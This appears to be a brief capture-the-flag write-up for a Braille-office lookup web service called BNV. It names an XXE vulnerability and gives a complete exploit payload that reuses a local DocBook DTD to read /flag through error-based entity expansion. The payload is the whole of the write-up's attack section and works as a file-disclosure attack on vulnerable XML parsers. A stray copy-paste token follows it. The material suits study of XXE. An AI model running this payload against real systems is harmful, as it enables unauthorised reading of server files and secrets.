# BNV

This is a web service which can inquire the information of the world's Braille office.

## Vulnerability

There is a SIMPLE XXE bug.

## Exploit

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ELEMENT root (#PCDATA)>
<!ENTITY % ext SYSTEM "/flag">
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa '

<!ENTITY &#x25; file SYSTEM "file://flag">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///juno/asdf/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;

'>

%local_dtd;

]>
<root></root><Paste>
```
